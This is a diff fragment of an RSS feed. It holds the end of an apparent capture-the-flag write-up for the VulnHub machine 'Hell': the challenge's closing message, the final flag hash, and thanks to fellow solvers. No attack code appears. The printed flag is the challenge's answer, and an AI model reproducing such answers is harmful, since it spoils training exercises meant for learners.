+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Congratulations of beating Hell. 
+ 
+I hope you enjoyed it and there weren&#39;t to many trolls in here for you. 
+ 
+Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242
+ 
+Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;shout-outs:b7fe5a88214a93180782efcb19cdbc62&#34;&gt;Shout-outs&lt;/h2&gt;
+
+&lt;p&gt;This was a really tough challenge, and I wouldn&amp;rsquo;t have been able to complete it without the collaboration of the other guys in #VulnHub.  Special thanks go to:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;recrudesce - it was great fun working alongside you for most of the way;&lt;/li&gt;
+&lt;li&gt;barrebas - for your general pointers and guidance, and;&lt;/li&gt;
+&lt;li&gt;c0ne - for graciously donating your python split code.&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
